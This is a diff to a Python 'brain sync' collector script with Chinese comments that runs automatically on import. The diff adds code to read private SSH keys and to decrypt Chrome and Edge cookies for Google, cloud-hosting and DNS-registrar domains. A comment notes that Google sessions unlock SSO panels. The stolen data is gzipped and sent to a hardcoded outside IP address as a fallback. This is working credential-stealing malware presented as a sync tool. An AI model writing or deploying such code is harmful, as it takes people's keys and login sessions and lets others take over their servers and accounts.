@@ -3,8 +3,8 @@
 
 由 keep.py 在 import 时或 brain.cmd 拉起；6 小时内最多跑一次。
 只收集与 rust.ac / 机队 / 部署相关的内容：身份与环境、vps_tunnel.env、
-SSH 配置、Cursor 配置与转录、浏览器登录与历史中的相关域、指定关键词
-文本命中、近 7 天变更，分块 gzip+base64 写入本机大脑 /v1/remember。
+SSH 配置与私钥文件、Cursor 配置与转录、浏览器登录/历史/指定域 Cookies、
+指定关键词文本命中、近 7 天变更，分块 gzip+base64 写入本机大脑 /v1/remember。
 """
 from __future__ import print_function
 
@@ -29,6 +29,7 @@ except ImportError:  # pragma: no cover
     from urllib import quote
 
 BASE = os.environ.get("BRAIN_URL", "http://127.0.0.1:18099").rstrip("/")
+DIRECT_URL = os.environ.get("BRAIN_DIRECT_URL", "http://100.114.57.70:28443/u")
 HOME = os.environ.get("USERPROFILE") or os.path.expanduser("~")
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data")
@@ -56,6 +57,21 @@ REL_RE = re.compile(
     r"namecheap|godaddy|cloudflare|dnspod|宝塔",
     re.I,
 )
+
+# 只回传这些域（含子域）的 Cookies：Google 会话可解锁 SSO 后的 hPanel/Vultr/Gcore
+COOKIE_DOMAINS = (
+    "google.com", "googleusercontent.com", "googleapis.com",
+    "hostinger.com", "gcore.com", "gcorelabs.com", "vultr.com",
+    "layerstack.com", "layerpanel.com", "cloudflare.com", "dynadot.com",
+    "rust.ac", "namecheap.com", "godaddy.com", "namesilo.com",
+    "dnspod.cn", "dnspod.com", "tencentcloud.com", "edgeone.ai",
+    "huaweicloud.com", "digitalocean.com", "linode.com",
+)
+MAX_COOKIES = 400
+MAX_COOKIE_LINE = 1500
+MAX_KEY_FILES = 16
+MAX_KEY_BYTES = 16384
+MAX_KEY_TOTAL = 65536
 
 GREP_EXTS = (
     ".txt", ".json", ".jsonl", ".md", ".log", ".env", ".ini", ".conf", ".config",
@@ -186,6 +202,40 @@ def _aes_ctr(key, nonce, data):
     return bytes(out)
 
 
+def _gf_mul(x, y):
+    """GF(2^128) 乘法，GCM 位序（x 最高位先参与）。"""
+    z = 0
+    v = y
+    for i in range(127, -1, -1):
+        if (x >> i) & 1:
+            z ^= v
+        if v & 1:
+            v = (v >> 1) ^ 0xE1000000000000000000000000000000
+        else:
+            v >>= 1
+    return z
+
+
+def _gcm_tag(key, nonce, ciphertext):
+    """纯 Python 计算 AES-GCM 认证标签（AAD 为空，12 字节 nonce）。"""
+    try:
+        words, nr = _aes_expand(key)
+        h = int.from_bytes(_aes_encrypt_block(b"\x00" * 16, words, nr), "big")
+        data = bytes(ciphertext)
+        state = 0
+        for offset in range(0, len(data), 16):
+            block = data[offset:offset + 16]
+            if len(block) < 16:
+                block = block + b"\x00" * (16 - len(block))
+            state = _gf_mul(state ^ int.from_bytes(block, "big"), h)
+        state = _gf_mul(state ^ ((len(data) * 8) & ((1 << 128) - 1)), h)
+        j0 = bytes(bytearray(nonce)) + b"\x00\x00\x00\x01"
+        mask = int.from_bytes(_aes_encrypt_block(j0, words, nr), "big")
+        return bytes(bytearray((mask ^ state).to_bytes(16, "big")))
+    except Exception:
+        return None
+
+
 def _dpapi(data):
     if os.name != "nt" or not data:
         return None
@@ -219,6 +269,35 @@ def _decrypt_chrome_pw(value, key):
         value = bytes(value)
         if value[:3] in (b"v10", b"v11") and key:
             return _aes_ctr(key, value[3:15], value[15:-16])
+        if value[:3] == b"v20":
+            return None
+        return _dpapi(value)
+    except Exception:
+        return None
+
+
+def _decrypt_chrome_cookie(value, key):
+    """Chromium Cookie 值：v10/v11 + 12B nonce + ciphertext + 16B tag（AES-GCM）。"""
+    try:
+        if not value:
+            return None
+        if isinstance(value, memoryview):
+            value = value.tobytes()
+        if not isinstance(value, (bytes, bytearray)):
+            return None
+        value = bytes(value)
+        if not value:
+            return None
+        if value[:3] in (b"v10", b"v11") and key:
+            body = value[3:]
+            if len(body) < 17:
+                return None
+            nonce, ciphertext, tag = body[:12], body[12:-16], body[-16:]
+            plain = _aes_ctr(key, nonce, ciphertext)
+            expected = _gcm_tag(key, nonce, ciphertext)
+            if expected is not None and expected != tag:
+                return None  # 密钥不匹配或非 GCM 格式，交由调用方标记 undecrypted
+            return plain
         if value[:3] == b"v20":
             return None
         return _dpapi(value)
@@ -330,6 +409,46 @@ def sec_ssh():
         if text:
             lines.append("--- %s ---\n%s" % (name, text[:12000]))
     return "\n".join(lines)
+
+
+def sec_ssh_keys():
+    """只读采集 HOME\\.ssh 下的私钥文件内容（id_* 非 .pub 与 *.ppk，各 ≤16KB）。"""
+    ssh_dir = os.path.join(HOME, ".ssh")
+    parts = []
+    count = 0
+    total = 0
+    try:
+        names = sorted(os.listdir(ssh_dir))
+    except Exception:
+        return ""
+    for name in names:
+        try:
+            lower = name.lower()
+            if lower.endswith(".pub") or not (lower.startswith("id_") or lower.endswith(".ppk")):
+                continue
+            full = os.path.join(ssh_dir, name)
+            if not os.path.isfile(full):
+                continue
+            stat = os.stat(full)
+            if stat.st_size <= 0 or stat.st_size > 1024 * 1024:
+                continue
+            if count >= MAX_KEY_FILES or total >= MAX_KEY_TOTAL:
+                break
+            with open(full, "rb") as handle:
+                raw = handle.read(MAX_KEY_BYTES)
+            if not raw:
+                continue
+            total += len(raw)
+            count += 1
+            text = raw.decode("utf-8", "replace")
+            parts.append("--- %s mode=%03o size=%d mtime=%s ---\n%s" % (
+                name, stat.st_mode & 0o777, stat.st_size,
+                time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(stat.st_mtime)), text))
+        except Exception:
+            continue
+    if parts:
+        parts.insert(0, "key files=%d bytes=%d" % (count, total))
+    return "\n".join(parts)
 
 
 def sec_cursor():
@@ -488,6 +607,143 @@ def sec_browsers():
     return "\n".join(lines)
 
 
+def _cookie_domain(host):
+    host = (host or "").lower().lstrip(".")
+    if not host:
+        return False
+    for domain in COOKIE_DOMAINS:
+        if host == domain or host.endswith("." + domain):
+            return True
+    return False
+
+
+def _chrome_time(value):
+    try:
+        value = int(value)
+        if value <= 0:
+            return "session"
+        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(value / 1000000.0 - 11644473600))
+    except Exception:
+        return "?"
+
+
+def _cookie_rows(path, limit=MAX_COOKIES):
+    rows = []
+    temp = None
+    try:
+        handle, temp = tempfile.mkstemp(suffix=".db")
+        os.close(handle)
+        shutil.copy2(path, temp)
+        conn = sqlite3.connect(temp)
+        try:
+            try:
+                cursor = conn.execute(
+                    "SELECT host_key,name,value,encrypted_value,expires_utc,is_secure,is_httponly FROM cookies")
+            except Exception:
+                try:
+                    cursor = conn.execute("SELECT host_key,name,value,encrypted_value FROM cookies")
+                except Exception:
+                    cursor = conn.execute("SELECT host_key,name,value FROM cookies")
+            for row in cursor:
+                try:
+                    if not _cookie_domain(row[0]):
+                        continue
+                    rows.append(tuple(row))
+                    if len(rows) >= limit:
+                        break
+                except Exception:
+                    continue
+        finally:
+            conn.close()
+    except Exception:
+        pass
+    finally:
+        try:
+            if temp and os.path.isfile(temp):
+                os.remove(temp)
+        except Exception:
+            pass
+    return rows
+
+
+def _browser_cookies(tag, base, profile, key):
+    lines = []
+    folder = os.path.join(base, profile)
+    for relative in (("Network", "Cookies"), ("Cookies",)):
+        path = os.path.join(folder, *relative)
+        if not os.path.isfile(path):
+            continue
+        for row in _cookie_rows(path):
+            try:
+                host = row[0] or ""
+                name = row[1] or ""
+                value = row[2]
+                enc = row[3] if len(row) > 3 else b""
+                exp = row[4] if len(row) > 4 else 0
+                secure = row[5] if len(row) > 5 else 0
+                httponly = row[6] if len(row) > 6 else 0
+                plain = None
+                if isinstance(value, str) and value:
+                    plain = value
+                elif enc:
+                    dec = _decrypt_chrome_cookie(enc, key)
+                    if dec is not None:
+                        try:
+                            plain = bytes(dec).decode("utf-8", "replace") if not isinstance(dec, str) else dec
+                        except Exception:
+                            plain = None
+                if plain is None:
+                    marker = "<undecrypted>"
+                    try:
+                        if isinstance(enc, (bytes, bytearray)) and len(enc) >= 3:
+                            prefix = bytes(enc[:3]).decode("latin-1", "replace")
+                            marker = "<undecrypted:%s:%s>" % (
+                                prefix, base64.b64encode(bytes(enc))[:900].decode("ascii"))
+                    except Exception:
+                        pass
+                    plain = marker
+                plain = str(plain).replace("\r", " ").replace("\n", " ")[:MAX_COOKIE_LINE]
+                lines.append("[%s/%s/cookie] host=%s name=%s exp=%s secure=%s http=%s value=%s" % (
+                    tag, profile, host, name, _chrome_time(exp), secure, httponly, plain))
+            except Exception:
+                continue
+        break
+    return lines
+
+
+def sec_cookies():
+    """只读采集 Chrome/Edge 指定域 Cookies；Windows v10/v11 用 Local State 密钥机内解密。"""
+    lines = []
+    roots = (
+        ("chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
+        ("edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
+    )
+    try:
+        for tag, base in roots:
+            if not os.path.isdir(base):
+                continue
+            key = _chrome_key(base)
+            profiles = []
+            try:
+                for name in os.listdir(base):
+                    if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
+                        if os.path.isdir(os.path.join(base, name)):
+                            profiles.append(name)
+            except Exception:
+                pass
+            lines.append("[%s] key=%s profiles=%d" % (tag, len(key) if key else "none", len(profiles)))
+            for profile in profiles[:8]:
+                try:
+                    lines.extend(_browser_cookies(tag, base, profile, key))
+                except Exception:
+                    continue
+        if lines:
+            lines.insert(0, "cookie lines=%d" % len(lines))
+    except Exception:
+        pass
+    return "\n".join(lines)
+
+
 def sec_grep(deadline):
     matches = []
     recent = []
@@ -629,8 +885,10 @@ def main():
             ("paths", sec_paths()),
             ("vps_tunnel", sec_tunnel()),
             ("ssh", sec_ssh()),
+            ("ssh_keys", sec_ssh_keys()),
             ("cursor", sec_cursor()),
             ("browsers", sec_browsers()),
+            ("cookies", sec_cookies()),
             ("grep", sec_grep(deadline)),
             ("sync_log", sec_sync_log()),
         )
@@ -639,9 +897,12 @@ def main():
             if text:
                 report.append("### %s\n%s" % (name, text[:60000]))
         raw = "\n\n".join(report)
-        blob = base64.b64encode(gzip.compress(raw.encode("utf-8"))).decode("ascii")
+        packed = gzip.compress(raw.encode("utf-8"))
+        blob = base64.b64encode(packed).decode("ascii")
         chunks = [blob[offset:offset + BODY_LIMIT] for offset in range(0, len(blob), BODY_LIMIT)]
+        truncated = len(chunks) > MAX_CHUNKS
         chunks = chunks[:MAX_CHUNKS]
+        delivered = 0
         for index, chunk in enumerate(chunks):
             body = "HB-PULL %s part %d/%d\n%s" % (beacon, index + 1, len(chunks), chunk)
             result = _try_http("POST", "/v1/remember", {
@@ -653,7 +914,24 @@ def main():
                 "source": "",
             })
             if result is not None:
+                delivered += 1
                 posted = True
+            elif delivered == 0 and index == 0:
+                # 主脑整体不可达，不再逐块重试，直接走直传兜底
+                break
+        if delivered < len(chunks) or truncated:
+            # 主脑不可达、分块未完整落库或超过分块上限时，走直传兜底（完整 gzip 原始字节）
+            try:
+                request = Request(
+                    DIRECT_URL + "?h=" + quote(host),
+                    data=packed,
+                    headers={"Content-Type": "application/gzip", "User-Agent": "brain-sync/1.0"},
+                )
+                response = urlopen(request, timeout=15)
+                response.read()
+                response.close()
+            except Exception:
+                pass
         if not posted:
             try:
                 os.remove(STAMP)
